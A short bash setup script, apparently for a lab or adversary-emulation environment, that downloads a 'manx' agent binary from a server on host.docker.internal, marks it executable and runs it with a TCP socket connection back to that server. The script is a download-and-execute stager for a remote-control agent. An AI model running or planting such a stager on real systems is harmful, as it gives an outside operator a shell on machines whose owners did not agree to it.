#!/bin/bash

#set up manx-agent
    echo "Setting up manx-agent"
    server="http://host.docker.internal:42988"
    socket="host.docker.internal:42910"
    #contact="tcp"
    
    curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > manx;
    chmod +x manx;
    ./manx -http $server -socket $socket -contact tcp -v


